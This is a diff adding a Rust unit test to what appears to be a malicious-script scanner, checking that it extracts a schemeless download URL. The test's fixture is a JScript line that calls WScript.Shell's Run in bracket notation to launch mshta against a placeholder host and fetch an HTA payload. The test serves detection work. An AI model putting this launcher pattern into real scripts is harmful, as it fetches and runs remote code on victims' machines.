@@ -20134,6 +20134,27 @@ new ActiveXObject("WScript.Shell").Run(cmd);"#
     }
 
     #[test]
+    fn js_wscript_shell_bracket_run_schemeless_url_extracted() {
+        let mut env = Environment::new(&Config::default());
+        let js =
+            br#"new ActiveXObject("WScript.Shell")["Run"]("mshta js-bracket-run.example/payload.hta");"#
+                .to_vec();
+        env.all_extracted_jscript.push(js);
+        crate::js_scan::scan_js_payloads(&mut env);
+        assert!(
+            env.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::Download { src, .. }
+                        if src == "http://js-bracket-run.example/payload.hta"
+                )
+            }),
+            "JS WScript.Shell bracket Run schemeless URL missed: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
     fn js_wscript_shell_exec_schemeless_url_extracted() {
         let mut env = Environment::new(&Config::default());
         let js =
